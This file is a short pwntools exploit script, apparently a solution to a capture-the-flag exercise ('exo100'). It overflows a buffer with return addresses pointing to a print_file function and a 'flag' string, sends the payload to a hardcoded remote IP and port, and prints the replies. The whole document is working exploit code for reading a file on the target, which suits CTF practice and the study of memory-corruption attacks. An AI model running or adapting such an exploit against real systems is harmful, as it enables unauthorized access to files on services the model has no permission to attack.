from pwn import * # CONNECT:
target = remote("163.172.39.203", 9020) # TCP connection on port 9000
#target = remote("0.0.0.0", 9000) # TCP connection on port 9000
# target = process("./exo") # launch exercise exo100


buf = b'a' * 57
#buf += p32(0x80494A9) # get_data
buf += p32(0x080493F6) # print_file
buf += p32(0x0804C034) # exit
buf += p32(0x0804A05C) # 1st arg : on s'en fou
buf += p32(0x804c1a4) # 2nd arg : end of glb_buf

# Add padding for overflow
if (len(buf) % 255 < 8):
    size = 295
elif (len(buf) % 255 > 40):
    size = 264-len(buf)
else:
    size = 0
#size = 183
print("size: %s" % hex(size))
print("len buf: %s" % hex(len(buf)))
print("len buf + size: %s" % hex(len(buf)%255 + size) )
buf += b'b' * (size - 4) # cat for flag
buf += b'flag\0' # Add flag at the end of the glb_buf
target.sendline(buf)

print("sending...")
target.sendline(buf)
print("recv...")

for i in range (100) :
    print(target.recvline())

